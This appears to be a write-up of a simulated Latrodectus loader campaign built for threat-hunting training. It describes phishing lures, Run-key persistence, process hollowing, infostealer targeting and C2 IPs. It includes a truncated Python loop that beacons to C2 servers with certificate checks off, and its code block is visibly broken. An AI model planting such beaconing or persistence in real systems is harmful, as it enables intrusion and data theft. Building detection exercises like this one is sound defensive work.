# Latrodectus Stealthy Loader Scenario Creation

## Overview

This document outlines the process used to create a realistic Latrodectus stealthy loader campaign scenario for threat hunting training purposes. The scenario simulates a sophisticated multi-stage attack attributed to the Lunar Spider threat group, involving phishing email delivery, stealthy malware deployment, persistence establishment, and credential theft operations targeting North American organizations.

## Steps to Create the Scenario

### Step 1: Phishing Email Infrastructure Setup
- Created realistic phishing email template with subject "Urgent: Invoice Payment Required"
- Developed weaponized ZIP attachment `invoice_details.zip` containing loader executable
- Set up spoofed sender domain `accounting@legitimate-company.org` for social engineering
- Configured email delivery to target user "labuser@company.com"
- Implemented attachment masquerading techniques (executable disguised as document)

### Step 2: Latrodectus Loader Component Creation
- Developed fake `svchost.exe` binary to simulate legitimate Windows process
- Created loader configuration file `config.dat` with encrypted C2 settings
- Built `loader.dll` component for process injection and payload management
- Implemented SHA256 hash: `a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456`
- Configured loader to deploy in `C:\Users\labuser\AppData\Local\Temp\` directory

### Step 3: Command & Control Infrastructure
- Established C2 server at IP address `185.243.96.200` on port `443`
- Configured encrypted HTTPS beaconing with 5-minute intervals
- Set up secondary C2 infrastructure at `203.0.113.75` and `198.51.100.42`
- Implemented payload download and command execution capabilities
- Created realistic C2 traffic patterns for authentic simulation

### Step 4: Persistence Mechanism Implementation
- Modified Windows registry to establish Run key persistence
- Created registry entry: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- Set value name: `SystemUpdate` with data: `C:\Users\labuser\AppData\Local\Temp\svchost.exe -silent`
- Implemented service installation for system-level persistence
- Configured startup mechanisms to survive system reboots

### Step 5: Process Injection and Evasion Techniques
- Implemented process hollowing targeting legitimate `explorer.exe` process
- Created command line: `svchost.exe -decode -inject explorer.exe`
- Developed anti-analysis techniques including sandbox detection
- Implemented security tool enumeration and evasion capabilities
- Created process name masquerading to avoid detection

### Step 6: Infostealer Payload Deployment
- Developed credential harvesting module targeting browser data
- Created cryptocurrency wallet file collection capabilities
- Implemented stored password extraction from common applications
- Set up data exfiltration via HTTPS POST to C2 infrastructure
- Configured targeting of Chrome, Firefox, and Edge browser databases

beacon_interval = 300  # 5 minutes

while True:
    for server in c2_servers:
        try:
            response = requests.post(f"https://{server}/beacon", 
                                   data={"host": "abe-mde-est", "user": "labuser"},
                                   verify=False, timeout=10)
        except:
            pass
    time.sleep(beacon_interval)
```

## Safety Considerations

### Security Measures Implemented
- **Isolated Environment:** All activity contained within controlled Azure test network
- **Simulated Malware:** No actual malicious code, only behavioral simulation
- **Controlled C2:** Mock command & control servers with no real capabilities
- **Safe Payloads:** Infostealer components simulate data theft without actual credential access
- **Easy Cleanup:** All components easily identifiable and removable

### Risk Mitigation
- No production systems or real corporate networks involved
- Test environment completely isolated from production infrastructure
- All malicious components clearly marked and documented
- Immediate cleanup procedures prepared and tested
- No actual data theft or unauthorized access capabilities

## Advanced Evasion Techniques Simulated

### Anti-Analysis Features
- **Sandbox Detection:** Check for virtual machine indicators
- **Security Tool Enumeration:** Identify installed security products
- **Process Name Masquerading:** Mimic legitimate Windows processes
- **Encrypted Communications:** Use HTTPS for all C2 traffic
- **Persistence Redundancy:** Multiple persistence mechanisms

### Realistic Attack Behaviors
- **Delayed Execution:** Wait periods to avoid automated analysis
- **Gradual Deployment:** Multi-stage payload delivery
- **Credential Harvesting:** Systematic data collection simulation
- **Network Beaconing:** Regular C2 check-ins with jitter
- **File System Manipulation:** Strategic placement in common directories
